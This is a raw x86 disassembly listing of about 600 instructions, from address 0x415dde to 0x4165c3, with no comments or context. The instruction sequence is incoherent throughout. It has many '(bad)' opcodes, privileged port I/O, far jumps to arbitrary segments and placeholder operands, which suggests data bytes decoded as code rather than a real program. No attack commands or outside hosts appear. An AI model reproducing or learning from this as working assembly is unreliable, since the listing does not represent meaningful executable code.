  415dde:	rol    ebp,0x3e
  415de1:	or     eax,0x19ef6d74
  415de6:	mov    al,ds:0xc7b4a42f
  415deb:	neg    edi
  415ded:	sbb    DWORD PTR [ebp+0x2b],0x31e8c27f
  415df4:	in     al,0x36
  415df6:	call   0x8501a039
  415dfb:	shr    DWORD PTR [ebx],0x9b
  415dfe:	push   0x4df15ede
  415e03:	sti    
  415e04:	pop    eax
  415e05:	mov    ah,0xa1
  415e07:	mov    dl,0xd2
  415e09:	cmp    edi,DWORD PTR [esi]
  415e0b:	shl    BYTE PTR [edx-0x71],0x42
  415e0f:	xor    BYTE PTR [ebx],0x1c
  415e12:	out    dx,eax
  415e13:	mov    eax,ds:0x58a466cb
  415e18:	mov    bl,0x2e
  415e1a:	adc    BYTE PTR [eax-0x74],bl
  415e1d:	dec    esp
  415e1e:	push   edi
  415e1f:	lods   al,BYTE PTR ds:[esi]
  415e20:	aas    
  415e21:	adc    al,0xe0
  415e23:	les    ebx,FWORD PTR [ebp-0x5b]
  415e26:	in     eax,dx
  415e27:	popa   
  415e28:	sbb    ch,BYTE PTR [ebx]
  415e2a:	aad    0x34
  415e2c:	inc    esi
  415e2d:	pop    ecx
  415e2e:	mov    ss,WORD PTR [edi-0x1a]
  415e31:	in     al,0xfa
  415e33:	ss dec edi
  415e35:	stc    
  415e36:	mov    ebp,0x632ffcab
  415e3b:	pop    ds
  415e3c:	rol    DWORD PTR [ecx],cl
  415e3e:	push   0xffffff9c
  415e40:	push   edx
  415e41:	retf   0x23b
  415e44:	mov    edx,0x329a6e7d
  415e49:	mov    WORD PTR [eax+0x31],?
  415e4c:	and    al,0x85
  415e4e:	in     eax,dx
  415e4f:	or     dl,bh
  415e51:	dec    esp
  415e52:	jnp    0x415ed2
  415e54:	mov    dh,0xe1
  415e56:	shr    dl,cl
  415e58:	jo     0x415de6
  415e5a:	(bad)  
  415e5b:	or     eax,0x1b1d8577
  415e60:	mov    WORD PTR [edi-0x35],ss
  415e63:	je     0x415dfd
  415e65:	in     eax,dx
  415e66:	and    al,0x16
  415e68:	xchg   BYTE PTR [edx+0x21],bh
  415e6b:	pop    ecx
  415e6c:	jne    0x415e11
  415e6e:	xchg   BYTE PTR [ebp-0x78b77b8c],ah
  415e74:	mov    eax,ss:0x6c76fe9b
  415e7a:	(bad)  
  415e7b:	mov    dh,0x7b
  415e7d:	mov    ah,0x56
  415e7f:	xchg   ecx,eax
  415e80:	int    0x40
  415e82:	pop    ss
  415e83:	xchg   DWORD PTR [ecx+0x7cc63b55],ecx
  415e89:	inc    esi
  415e8a:	in     al,0x95
  415e8c:	push   ebx
  415e8d:	mov    edi,0x4a617d18
  415e92:	adc    eax,0xc076ad4f
  415e97:	jmp    0x927d:0x5a650371
  415e9e:	sbb    BYTE PTR [edi],ah
  415ea0:	loop   0x415e55
  415ea2:	cli    
  415ea3:	pop    eax
  415ea4:	adc    BYTE PTR [edx],ch
  415ea6:	push   ebx
  415ea7:	test   BYTE PTR [edi],dh
  415ea9:	pop    esp
  415eaa:	pushf  
  415eab:	and    BYTE PTR [ecx+0x2263f2bb],0xcd
  415eb2:	mov    DWORD PTR [eax],0x832e3484
  415eb8:	jb     0x415f23
  415eba:	aas    
  415ebb:	inc    ebp
  415ebc:	aaa    
  415ebd:	rcr    ecx,1
  415ebf:	(bad)  
  415ec0:	repz ror BYTE PTR [esi],cl
  415ec3:	ja     0x415e47
  415ec5:	in     eax,dx
  415ec6:	or     al,0x31
  415ec8:	and    BYTE PTR [esi-0x149a7ad7],cl
  415ece:	pop    ss
  415ecf:	mov    eax,0x1f157d2d
  415ed4:	or     esp,DWORD PTR [eax-0x5cbd5d2f]
  415eda:	cmp    al,0x4d
  415edc:	mov    al,ds:0xf63a60eb
  415ee1:	in     al,dx
  415ee2:	sub    al,0xa7
  415ee4:	cmp    eax,0xd9d2bcf4
  415ee9:	cmp    BYTE PTR ss:[ebx],al
  415eec:	ret    
  415eed:	inc    esi
  415eee:	clc    
  415eef:	int3   
  415ef0:	in     eax,dx
  415ef1:	out    dx,al
  415ef2:	mov    esp,0xd9a6a6f0
  415ef7:	loop   0x415f13
  415ef9:	fwait
  415efa:	xchg   edi,eax
  415efb:	fld    st(0)
  415efd:	jle    0x415f57
  415eff:	mov    eax,0x6a1c7b2f
  415f04:	mov    ds:0x2d24b465,al
  415f09:	sbb    al,0x9b
  415f0b:	mov    eax,ds:0xa690f54f
  415f10:	in     al,0x71
  415f12:	ja     0x415f3e
  415f14:	jae    0x415eb1
  415f16:	inc    BYTE PTR [ecx+0x36ac759]
  415f1c:	pop    ebp
  415f1d:	shr    BYTE PTR ds:0xcb9e721c,1
  415f23:	pop    edx
  415f24:	sbb    edx,edx
  415f26:	inc    esp
  415f27:	xor    BYTE PTR [esi+0xd],ch
  415f2a:	cmp    ecx,DWORD PTR [esi+0x3b]
  415f2d:	jmp    0xcb0:0x77043544
  415f34:	mov    edi,0xd37ebc5
  415f39:	jg     0x415f35
  415f3b:	dec    ecx
  415f3c:	repz rcr dh,1
  415f3f:	loop   0x415f7d
  415f41:	jge    0x415ee8
  415f43:	sub    BYTE PTR [eax-0x4d4bd434],bl
  415f49:	hlt    
  415f4a:	scas   al,BYTE PTR es:[edi]
  415f4b:	push   ss
  415f4c:	fcomp  st(7)
  415f4e:	out    dx,al
  415f4f:	cwde   
  415f50:	mov    ch,0xc5
  415f52:	sub    esi,DWORD PTR [ecx]
  415f54:	sub    BYTE PTR [ebx],0x40
  415f57:	jecxz  0x415f8d
  415f59:	or     eax,0x3508d78f
  415f5e:	outs   dx,DWORD PTR ds:[esi]
  415f5f:	lds    esp,FWORD PTR [edx-0xfcc2d3b]
  415f65:	pop    esp
  415f66:	dec    edx
  415f67:	push   ss
  415f68:	cdq    
  415f69:	sbb    esi,ebp
  415f6b:	xor    eax,0x8f44f3b0
  415f70:	sub    ebp,DWORD PTR [esi+edi*8+0x58a80a66]
  415f77:	adc    al,0x53
  415f79:	xor    eax,0xd363da1c
  415f7e:	fucom  st(3)
  415f80:	xor    DWORD PTR [ebp-0x44],edi
  415f83:	pop    ebx
  415f84:	fild   DWORD PTR [esi]
  415f86:	inc    esp
  415f87:	mov    bh,0x7c
  415f89:	sahf   
  415f8a:	mov    ds:0xd33fd310,eax
  415f8f:	mov    ecx,0xb8f8aa0b
  415f94:	sbb    bl,ch
  415f96:	add    BYTE PTR [esi+0x16],dl
  415f99:	sbb    esi,ebp
  415f9b:	dec    edx
  415f9c:	repnz (bad) 
  415f9e:	and    DWORD PTR [ebp+0x36],ecx
  415fa1:	stos   DWORD PTR es:[edi],eax
  415fa2:	sbb    BYTE PTR [ebp-0x4d],dh
  415fa5:	pop    es
  415fa6:	jl     0x415f8f
  415fa8:	jp     0x415f92
  415faa:	outs   dx,BYTE PTR ss:[esi]
  415fac:	xchg   esp,eax
  415fad:	fcmovne st,st(3)
  415faf:	hlt    
  415fb0:	adc    eax,0x36ee21a9
  415fb5:	xchg   edi,eax
  415fb6:	jbe    0x415ff6
  415fb8:	test   DWORD PTR [ecx+0x69a157e0],ecx
  415fbe:	xchg   ebx,eax
  415fbf:	es loop 0x416010
  415fc2:	and    al,0x1b
  415fc4:	mov    ecx,gs
  415fc6:	cli    
  415fc7:	gs jp  0x415f5b
  415fca:	push   ebx
  415fcb:	rol    al,cl
  415fcd:	push   ds
  415fce:	je     0x415f6f
  415fd0:	or     al,0x4f
  415fd2:	push   ss
  415fd3:	mov    WORD PTR [ebp-0x2c],fs
  415fd6:	cmp    BYTE PTR [edx-0x3c9e9465],0x26
  415fdd:	mov    ds:0x70fc6bc4,al
  415fe2:	out    dx,eax
  415fe3:	dec    ebx
  415fe4:	xlat   BYTE PTR ds:[ebx]
  415fe5:	mov    eax,0x38bb562a
  415fea:	xchg   ebx,eax
  415feb:	(bad)  
  415fec:	push   cs
  415fed:	cmp    eax,0x80f7ce15
  415ff2:	mov    dh,0x86
  415ff4:	cli    
  415ff5:	stc    
  415ff6:	stos   BYTE PTR es:[edi],al
  415ff7:	mov    bh,0x13
  415ff9:	adc    BYTE PTR [ebx],cl
  415ffb:	aam    0xd7
  415ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ffe:	lahf   
  415fff:	xchg   esp,eax
  416000:	jo     0x415fb7
  416002:	enter  0xef94,0x77
  416006:	mov    ebx,?
  416008:	ja     0x416071
  41600a:	sti    
  41600b:	jl     0x41602a
  41600d:	dec    esi
  41600e:	int3   
  41600f:	ror    BYTE PTR [edx],1
  416011:	stos   DWORD PTR es:[edi],eax
  416012:	pushf  
  416013:	mov    esp,0xe9b1c414
  416018:	cmp    dh,BYTE PTR [esi-0x1b34b2aa]
  41601e:	cs jae 0x415ffb
  416021:	mov    edi,0x795892fb
  416026:	and    eax,0x3d21a0a4
  41602b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602c:	es in  al,dx
  41602e:	sub    esi,ebp
  416030:	cmp    DWORD PTR [esi-0x1a],edx
  416033:	mov    bl,BYTE PTR [ecx-0x42]
  416036:	fisttp WORD PTR [ebp+0xf6c1258]
  41603c:	add    al,0xd1
  41603e:	inc    ebx
  41603f:	mov    ecx,0xf5d078bf
  416044:	jmp    0x335bf318
  416049:	mov    bl,0x71
  41604b:	daa    
  41604c:	and    al,0x57
  41604e:	js     0x4160ac
  416050:	fadd   DWORD PTR ds:0x9a532f49
  416056:	outs   dx,DWORD PTR ds:[esi]
  416057:	mov    BYTE PTR [ebx-0x6c],0x3a
  41605b:	fmul   QWORD PTR [ebx-0x51]
  41605e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41605f:	xor    ch,BYTE PTR [esi]
  416061:	xchg   DWORD PTR [ebx-0x52dde2db],eax
  416067:	std    
  416068:	out    0xf9,eax
  41606a:	jge    0x4160ab
  41606c:	xlat   BYTE PTR ds:[ebx]
  41606d:	xchg   ch,dl
  41606f:	push   ds
  416070:	push   ds
  416071:	test   BYTE PTR [ecx+0x69c30d48],dl
  416077:	xchg   ecx,eax
  416078:	stc    
  416079:	dec    esi
  41607a:	mov    ds:0x3e3690f8,eax
  41607f:	aas    
  416080:	(bad)  
  416081:	pop    ebx
  416082:	pop    esi
  416083:	pop    esi
  416084:	add    edx,DWORD PTR [ecx-0x43]
  416087:	sub    al,BYTE PTR [esi]
  416089:	inc    ecx
  41608a:	mov    ah,0xee
  41608c:	cmc    
  41608d:	xchg   esi,eax
  41608e:	aaa    
  41608f:	ins    BYTE PTR es:[edi],dx
  416090:	push   0x2ac3a4d2
  416095:	shl    DWORD PTR [ebx],0xcb
  416098:	fstp   QWORD PTR [ebx]
  41609a:	fcomp  DWORD PTR [ecx+0x6b]
  41609d:	ins    BYTE PTR es:[edi],dx
  41609e:	test   eax,ecx
  4160a0:	xchg   ebp,eax
  4160a1:	and    al,0xc2
  4160a3:	dec    esi
  4160a4:	xchg   ecx,eax
  4160a5:	jmp    0xe64d:0xf00fc98c
  4160ac:	int    0xcf
  4160ae:	aam    0xc6
  4160b0:	or     edx,DWORD PTR [edi-0x62]
  4160b3:	ins    DWORD PTR es:[edi],dx
  4160b4:	call   0xf803:0x6307f3cf
  4160bb:	cmp    ah,dh
  4160bd:	cmp    bl,BYTE PTR [ebx]
  4160bf:	and    al,0x47
  4160c1:	mov    ebp,0xf7458d85
  4160c6:	ss mov bl,0x4
  4160c9:	(bad)  
  4160ca:	push   ds
  4160cb:	es inc esi
  4160cd:	js     0x416088
  4160cf:	shl    edx,0xb2
  4160d2:	faddp  st(2),st
  4160d4:	push   ecx
  4160d5:	imul   esi,DWORD PTR gs:[esi+0x23],0xffffffeb
  4160da:	call   0x92d0:0xe9063695
  4160e1:	add    ebx,edx
  4160e3:	pop    ecx
  4160e4:	out    dx,eax
  4160e5:	sub    bh,dh
  4160e7:	jae    0x4160b8
  4160e9:	fldenv ss:[ebx]
  4160ec:	push   esi
  4160ed:	ds jp  0x416163
  4160f0:	and    esi,edx
  4160f2:	sahf   
  4160f3:	mov    esp,0xf508bf09
  4160f8:	sbb    eax,0x288d818d
  4160fd:	mov    esp,0x41c1c244
  416102:	lock pop ebp
  416104:	sbb    edx,edx
  416106:	mov    dx,dx
  416109:	loopne 0x4160d1
  41610b:	pop    esp
  41610c:	aaa    
  41610d:	cld    
  41610e:	adc    ecx,DWORD PTR [edi-0x25ae9779]
  416114:	mov    bh,BYTE PTR [ebp-0x74]
  416117:	dec    esi
  416118:	xchg   ebx,eax
  416119:	xchg   edx,eax
  41611a:	xchg   edi,eax
  41611b:	sub    DWORD PTR [esi-0x6fa9ad09],ebp
  416121:	cmp    DWORD PTR [ecx+0x40],ebx
  416124:	inc    eax
  416125:	rcr    esp,0x9d
  416128:	dec    ecx
  416129:	or     ch,BYTE PTR [ebx-0x52fcd712]
  41612f:	adc    edx,DWORD PTR ds:0x97c3ac75
  416135:	lock mov edx,0x578d0e8e
  41613b:	xor    eax,0x41877144
  416140:	jbe    0x4160f3
  416142:	jo     0x4161a1
  416144:	sbb    ah,BYTE PTR [esi-0x47]
  416147:	ror    ebp,0xd0
  41614a:	cwde   
  41614b:	adc    ecx,eax
  41614d:	add    ah,BYTE PTR [ecx+0x19]
  416150:	imul   BYTE PTR [edx]
  416152:	aad    0xe6
  416154:	pop    eax
  416155:	fwait
  416156:	dec    esp
  416157:	pusha  
  416158:	xchg   esp,eax
  416159:	adc    bh,dh
  41615b:	jge    0x416106
  41615d:	in     al,0x47
  41615f:	les    ebx,FWORD PTR [ebx+ebp*8-0x35]
  416163:	add    bl,BYTE PTR [ecx]
  416165:	lahf   
  416166:	pop    ebp
  416167:	adc    DWORD PTR [bp+0x32],ebx
  41616b:	jg     0x4161e4
  41616d:	dec    ebp
  41616e:	sahf   
  41616f:	push   0x68b9ed0a
  416174:	or     eax,0xe983165e
  416179:	inc    ecx
  41617a:	arpl   WORD PTR [eax],di
  41617c:	ret    
  41617d:	ss jmp 0x358d:0x577c690f
  416185:	add    BYTE PTR [edx+0x754d2af8],0x6c
  41618c:	add    edx,DWORD PTR [eax]
  41618e:	pop    ss
  41618f:	imul   ebp,ecx,0xffffffa6
  416192:	jl     0x41616c
  416194:	call   0x59df:0x7ffdd310
  41619b:	mov    ds:0x979eefa9,eax
  4161a0:	jns    0x416213
  4161a2:	pop    eax
  4161a3:	add    bh,BYTE PTR [ebx+0x1e896321]
  4161a9:	ja     0x4161ed
  4161ab:	sbb    eax,0x45b776da
  4161b0:	push   0xd55b9293
  4161b5:	outs   dx,DWORD PTR ss:[esi]
  4161b7:	xchg   BYTE PTR [edx-0x27fe7e1d],al
  4161bd:	xchg   ebx,eax
  4161be:	nop
  4161bf:	or     BYTE PTR [edx+0x5c],bh
  4161c2:	mov    esi,DWORD PTR [ebx+0x19640d08]
  4161c8:	rol    dh,0xa6
  4161cb:	mov    ds:0x385615d2,al
  4161d0:	jg     0x41616a
  4161d2:	fwait
  4161d3:	inc    bx
  4161d5:	ss push es
  4161d7:	nop
  4161d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161d9:	rcr    DWORD PTR [edi],cl
  4161db:	or     BYTE PTR [ebp+0x4ce2d7a7],0x60
  4161e2:	mov    ah,0xc1
  4161e4:	ds pop ss
  4161e6:	in     al,0x2c
  4161e8:	out    0x28,al
  4161ea:	stc    
  4161eb:	cmp    eax,0x47d11961
  4161f0:	jbe    0x416217
  4161f2:	mov    al,0x21
  4161f4:	dec    esi
  4161f5:	in     al,dx
  4161f6:	(bad)  
  4161f7:	mov    edi,0x21c902e7
  4161fc:	inc    ecx
  4161fd:	leave  
  4161fe:	push   ecx
  4161ff:	in     al,0xb6
  416201:	dec    ebp
  416202:	in     al,0x55
  416204:	loop   0x4161c4
  416206:	cld    
  416207:	nop
  416208:	dec    ecx
  416209:	sub    ah,BYTE PTR [esi-0x6206472f]
  41620f:	jg     0x416259
  416211:	and    eax,0x2b1ea643
  416216:	retf   
  416217:	pop    ds
  416218:	mov    dh,0x1c
  41621a:	inc    esi
  41621b:	hlt    
  41621c:	mov    bl,BYTE PTR [eax]
  41621e:	sbb    al,0xb2
  416220:	sahf   
  416221:	push   ss
  416222:	mov    al,0xea
  416224:	mov    al,ds:0x99cf38a2
  416229:	xchg   esi,eax
  41622a:	and    BYTE PTR [ebx+0x5ea81859],bl
  416230:	stos   DWORD PTR es:[edi],eax
  416231:	out    dx,eax
  416232:	push   ss
  416233:	adc    eax,0x99c986da
  416238:	inc    edx
  416239:	xchg   esi,eax
  41623a:	mov    BYTE PTR [ecx+0x1a7e7623],ah
  416240:	adc    esi,esi
  416242:	ret    
  416243:	push   edx
  416244:	fistp  WORD PTR [ecx]
  416246:	inc    edi
  416247:	(bad)  
  416248:	sub    al,0xae
  41624a:	xchg   DWORD PTR [ebx+ebx*8+0x73ce05c9],eax
  416251:	sar    DWORD PTR [esi-0x4c5b4fda],0xaf
  416258:	loopne 0x4161e7
  41625a:	add    dl,dh
  41625c:	fisttp WORD PTR [esi-0x3b]
  41625f:	xchg   DWORD PTR [eax+0x7b],esi
  416262:	adc    bl,BYTE PTR [esp+ebp*2+0x15]
  416266:	dec    BYTE PTR [esi-0x10]
  416269:	and    bh,BYTE PTR [edi]
  41626b:	push   ss
  41626c:	call   0x496f:0xc901b98e
  416273:	xor    cl,0x16
  416276:	cwde   
  416277:	ret    0xab9a
  41627a:	adc    ebp,DWORD PTR [eax]
  41627c:	out    0x1f,eax
  41627e:	fidiv  WORD PTR ds:0xa66d915b
  416284:	push   esi
  416285:	dec    esi
  416286:	sbb    BYTE PTR [ebp-0x76f296a3],0x79
  41628d:	pop    ebp
  41628e:	push   es
  41628f:	test   BYTE PTR [eax+0x4eec48ea],dl
  416295:	cld    
  416296:	adc    eax,0x8ff9d0ab
  41629b:	cld    
  41629c:	fnsave [edx+0x20]
  41629f:	mov    WORD PTR [edi],cs
  4162a1:	(bad)  [eax]
  4162a3:	(bad)  ds:[esi]
  4162a6:	mov    ecx,0xa8e92bf
  4162ab:	adc    BYTE PTR [edx+edx*1],dl
  4162ae:	sub    eax,0xb0354f2e
  4162b4:	push   edi
  4162b5:	push   eax
  4162b6:	and    BYTE PTR [esi-0x47d6f4aa],cl
  4162bc:	ret    0x51c
  4162bf:	xchg   edi,eax
  4162c0:	sbb    al,0xd0
  4162c2:	lea    ebx,[edx-0x1dc33ad4]
  4162c8:	or     DWORD PTR [eax+0x7d],edx
  4162cb:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4162cd:	shl    BYTE PTR [ebx-0x39],cl
  4162d0:	clc    
  4162d1:	std    
  4162d2:	(bad)
  4162d5:	ror    bl,cl
  4162d7:	test   al,0x9d
  4162d9:	jno    0x416340
  4162db:	imul   ebp,DWORD PTR [edx],0xfffffffc
  4162de:	std    
  4162df:	xchg   ebp,eax
  4162e0:	imul   eax,DWORD PTR [eax-0x4c50d27d],0x56
  4162e7:	push   ss
  4162e8:	ins    DWORD PTR es:[edi],dx
  4162e9:	rcr    DWORD PTR [eax],1
  4162eb:	les    ebp,FWORD PTR [ecx]
  4162ed:	mov    ebx,0x63f0be0e
  4162f2:	(bad)  
  4162f3:	mov    esp,0x5c8c1a8f
  4162f8:	shl    DWORD PTR [ebp+0x7d],0x9c
  4162fc:	lss    ebx,FWORD PTR [ecx+0x5b51ebf0]
  416303:	stos   DWORD PTR es:[edi],eax
  416304:	add    al,0xe6
  416306:	jne    0x4162ad
  416308:	das    
  416309:	and    BYTE PTR [edx-0x39],dh
  41630c:	gs sub al,0x43
  41630f:	push   es
  416310:	add    cl,BYTE PTR [ecx+0x6]
  416313:	mov    ebx,0xcab77ce9
  416318:	jecxz  0x4162e3
  41631a:	ror    DWORD PTR [bp+di],1
  41631d:	inc    esp
  41631e:	stos   BYTE PTR es:[edi],al
  41631f:	push   esi
  416320:	fstp   QWORD PTR [esi]
  416322:	add    al,0x2c
  416324:	(bad)  
  416325:	loopne 0x416333
  416327:	scas   al,BYTE PTR es:[edi]
  416328:	push   ds
  416329:	in     al,0x43
  41632b:	add    cl,ch
  41632d:	xor    eax,0x6891a53a
  416332:	rol    DWORD PTR [edi],cl
  416334:	lock mov ecx,0x2f64778c
  41633a:	or     BYTE PTR [edx+0x63d92ffc],al
  416340:	adc    al,0x72
  416342:	push   es
  416343:	mov    es,WORD PTR [eax+0x78fb2ace]
  416349:	mov    cl,0x42
  41634b:	jbe    0x4162ed
  41634d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41634e:	iret   
  41634f:	mov    al,ds:0x9cf2f084
  416354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416355:	sahf   
  416356:	adc    eax,0x49850a68
  41635b:	adc    ch,BYTE PTR [eax+0x51]
  41635e:	or     dl,ah
  416360:	sbb    dl,BYTE PTR [ecx]
  416362:	cwde   
  416363:	pop    ecx
  416364:	pop    es
  416365:	leave  
  416366:	xor    eax,0x7bb68e47
  41636b:	sub    al,0x48
  41636d:	test   eax,0x2f58395e
  416372:	dec    edi
  416373:	arpl   sp,di
  416375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416376:	mov    bh,0xb4
  416378:	test   BYTE PTR [eax],dh
  41637a:	sbb    eax,0x1b780979
  41637f:	mov    bh,0x30
  416381:	push   edx
  416382:	mov    ds:0x5cd092c4,eax
  416387:	out    dx,eax
  416388:	addr16 fs add al,0xe5
  41638c:	neg    BYTE PTR [eax-0x16]
  41638f:	jbe    0x416347
  416391:	pop    edi
  416392:	in     eax,dx
  416393:	lss    ecx,FWORD PTR [eax-0x48]
  416397:	pop    ds
  416398:	mov    bh,0xe4
  41639a:	repz inc edi
  41639c:	rol    ebx,0xe3
  41639f:	mov    bl,BYTE PTR [esi-0x308a2039]
  4163a5:	call   0x65aa5808
  4163aa:	inc    ebp
  4163ab:	add    bh,BYTE PTR [edi-0x7e2534ff]
  4163b1:	jns    0x4163aa
  4163b3:	loop   0x4163ef
  4163b5:	ins    BYTE PTR es:[edi],dx
  4163b6:	addr16 add edi,esp
  4163b9:	das    
  4163ba:	add    DWORD PTR [esi+0x745db42],edi
  4163c0:	jo     0x4163ee
  4163c2:	cmp    eax,0x2ffe76b1
  4163c7:	jmp    0x416353
  4163c9:	pop    edi
  4163ca:	leave  
  4163cb:	pop    ss
  4163cc:	dec    eax
  4163cd:	fcomp  st(3)
  4163cf:	dec    esp
  4163d0:	or     BYTE PTR [edi+0x588e9e0],al
  4163d6:	mov    ebx,DWORD PTR [eax]
  4163d8:	out    0x74,al
  4163da:	in     al,0x8f
  4163dc:	add    al,dh
  4163de:	icebp  
  4163df:	(bad)  
  4163e0:	popf   
  4163e1:	jecxz  0x416388
  4163e3:	jp     0x416446
  4163e5:	xchg   bh,cl
  4163e7:	ret    0x9129
  4163ea:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4163ec:	sub    BYTE PTR [eax+0x73],cl
  4163ef:	jl     0x416371
  4163f1:	cmp    DWORD PTR [ecx],edi
  4163f3:	pusha  
  4163f4:	mov    edx,0x274331aa
  4163f9:	sub    BYTE PTR [ecx-0x3f],ah
  4163fc:	and    al,0x23
  4163fe:	mov    bh,0x29
  416400:	shl    BYTE PTR [ebx+eax*4],0xb8
  416404:	outs   dx,DWORD PTR ds:[esi]
  416405:	push   edx
  416406:	dec    esi
  416407:	mov    al,ds:0x8766307b
  41640c:	push   ecx
  41640d:	xor    eax,0x667a9222
  416412:	imul   edi,DWORD PTR [ecx],0xbb64e83e
  416418:	lock pop edi
  41641a:	sbb    BYTE PTR [ebx-0x690ad5e2],ah
  416420:	cmp    al,0xe
  416422:	mov    edi,0x7f1eac4d
  416427:	jle    0x41648c
  416429:	or     cl,ah
  41642b:	ds call 0x2420:0xf3937ffd
  416433:	xor    BYTE PTR [edx-0x10],0x1f
  416437:	bnd jbe 0x41647b
  41643a:	popa   
  41643b:	inc    edx
  41643c:	retf   0x6a30
  41643f:	mov    dh,0xb6
  416441:	adc    edx,DWORD PTR ds:0x6e4128c7
  416447:	aas    
  416448:	(bad)  
  41644a:	icebp  
  41644b:	repnz ds aaa 
  41644e:	(bad)  
  41644f:	std    
  416450:	outs   dx,BYTE PTR ds:[esi]
  416451:	retf   
  416452:	jno    0x41642e
  416454:	mov    bl,0x1
  416456:	xchg   esp,eax
  416457:	dec    eax
  416458:	jg     0x416497
  41645a:	adc    al,0xc9
  41645c:	shr    DWORD PTR [eax],0xb3
  41645f:	les    esp,FWORD PTR [ebx+0x5c]
  416462:	pcmpgtd mm4,QWORD PTR [ebp+0x685f534c]
  416469:	das    
  41646a:	xchg   edi,eax
  41646b:	xchg   BYTE PTR [edx],bh
  41646d:	cmp    BYTE PTR [edi+ebx*1],ah
  416470:	dec    dl
  416472:	dec    ebp
  416473:	mov    ecx,0x40c6e875
  416478:	push   cs
  416479:	xor    esi,DWORD PTR [eax+eax*1]
  41647c:	std    
  41647d:	xchg   ebp,eax
  41647e:	jp     0x41645f
  416480:	mov    al,0xaa
  416482:	dec    edi
  416483:	mov    dl,BYTE PTR [edi]
  416485:	call   0x4f06:0xd7e15114
  41648c:	cmp    eax,0x9a1bb55
  416491:	pop    edi
  416492:	mov    esp,0x3e84f32
  416497:	out    0x25,eax
  416499:	mov    ah,0x8e
  41649b:	rcr    DWORD PTR [edx+edx*1],0x87
  41649f:	div    DWORD PTR [esi]
  4164a1:	shl    DWORD PTR [ebp+0x2b17de4a],cl
  4164a7:	xor    ah,BYTE PTR [ecx]
  4164a9:	lods   al,BYTE PTR ds:[esi]
  4164aa:	and    al,0x89
  4164ac:	mov    dl,0x88
  4164ae:	(bad)  
  4164af:	xchg   ecx,eax
  4164b0:	iret   
  4164b1:	dec    ebp
  4164b2:	imul   DWORD PTR [esi+0x4444437a]
  4164b8:	xlat   BYTE PTR ds:[ebx]
  4164b9:	jp     0x416493
  4164bb:	in     al,dx
  4164bc:	and    al,0x69
  4164be:	or     bl,BYTE PTR [eax+0x6c478789]
  4164c4:	jmp    0x2497bdf3
  4164c9:	mov    eax,0xfe2067c9
  4164ce:	(bad)  
  4164cf:	sbb    al,0x65
  4164d1:	jmp    0x41647f
  4164d3:	mov    esi,0xd1bc5388
  4164d8:	rcr    BYTE PTR [ecx+0x3b],1
  4164db:	hlt    
  4164dc:	std    
  4164dd:	out    dx,eax
  4164de:	clc    
  4164df:	and    edx,DWORD PTR [ebp-0x16]
  4164e2:	ret    0xfdc5
  4164e5:	int3   
  4164e6:	xchg   ecx,eax
  4164e7:	push   ss
  4164e8:	pop    es
  4164e9:	mov    esi,0x71d67aa
  4164ee:	mov    BYTE PTR ss:[eax],0x9f
  4164f2:	inc    eax
  4164f3:	fist   DWORD PTR [ecx]
  4164f5:	xchg   edx,eax
  4164f6:	(bad)  
  4164f8:	imul   ecx,DWORD PTR [eax-0x3a],0x6510da7a
  4164ff:	in     al,0x4b
  416501:	sub    DWORD PTR [esi-0x49],ebp
  416504:	or     BYTE PTR cs:[eiz*4+0x7f45b8f3],dl
  41650c:	adc    BYTE PTR [esi+edi*1+0x1471ed42],bh
  416513:	in     al,0x20
  416515:	inc    eax
  416516:	pop    ecx
  416517:	in     eax,dx
  416518:	push   es
  416519:	aam    0xb8
  41651b:	sar    BYTE PTR [eax-0x2],cl
  41651e:	xor    al,0xe1
  416520:	ins    DWORD PTR es:[edi],dx
  416521:	push   esp
  416522:	retf   0x25ee
  416525:	mov    ds:0x79b63daa,al
  41652a:	das    
  41652b:	bound  edx,QWORD PTR [eax+0x77]
  41652e:	lahf   
  41652f:	call   0x75bd:0x60e10d19
  416536:	(bad)  
  416538:	xchg   edi,eax
  416539:	loope  0x4164e2
  41653b:	ret    0x53e1
  41653e:	clc    
  41653f:	js     0x416589
  416541:	sub    bh,BYTE PTR [ecx+0x1b252705]
  416547:	inc    esi
  416548:	cmp    BYTE PTR fs:[esp+eiz*4],bl
  41654c:	mov    edx,0x4ded3fba
  416551:	ds pop esp
  416553:	in     al,0x53
  416555:	mov    ebx,0x59cc43f6
  41655a:	(bad)  
  41655c:	call   0x82b626d7
  416561:	dec    edx
  416562:	sub    DWORD PTR [edi+0x46],edi
  416565:	ins    DWORD PTR es:[edi],dx
  416566:	xor    DWORD PTR [esi+ebp*8],0xffffffe0
  41656a:	in     eax,0x80
  41656c:	es das 
  41656e:	jne    0x41655a
  416570:	sub    eax,0x1c2c7159
  416575:	mov    cl,0x93
  416577:	xlat   BYTE PTR ds:[ebx]
  416578:	jp     0x4165d4
  41657a:	xchg   ecx,eax
  41657b:	imul   edi,DWORD PTR es:[ebp-0x26c36600],0xb7a0c4c9
  416586:	sbb    BYTE PTR [eax+0x48],bh
  416589:	sub    al,0x1a
  41658b:	push   edi
  41658c:	call   FWORD PTR [esi]
  41658e:	cmc    
  41658f:	cmp    ch,0xb7
  416592:	imul   ebp,DWORD PTR [ecx+0x76],0xffffffed
  416596:	iret   
  416597:	fsub   QWORD PTR [eax]
  416599:	fisttp QWORD PTR [edx+ebp*1]
  41659c:	push   eax
  41659d:	fild   QWORD PTR [edx-0x1f]
  4165a0:	(bad)  
  4165a1:	popf   
  4165a2:	add    ah,BYTE PTR [ebx+0x1a847647]
  4165a8:	jmp    0x8372392e
  4165ad:	xlat   BYTE PTR ds:[ebx]
  4165ae:	xchg   esi,eax
  4165af:	outs   dx,BYTE PTR ds:[esi]
  4165b0:	enter  0xebd4,0x96
  4165b4:	xchg   BYTE PTR [ecx+0x30],dl
  4165b7:	ds lahf 
  4165b9:	cmp    al,BYTE PTR [edx]
  4165bb:	xchg   ebx,eax
  4165bc:	mov    bl,BYTE PTR [esi]
  4165be:	fs push esi
  4165c0:	gs (bad) 
  4165c2:	pop    ebp
  4165c3:	shr    DWORD PTR [ebp-0x2a88b88e],cl
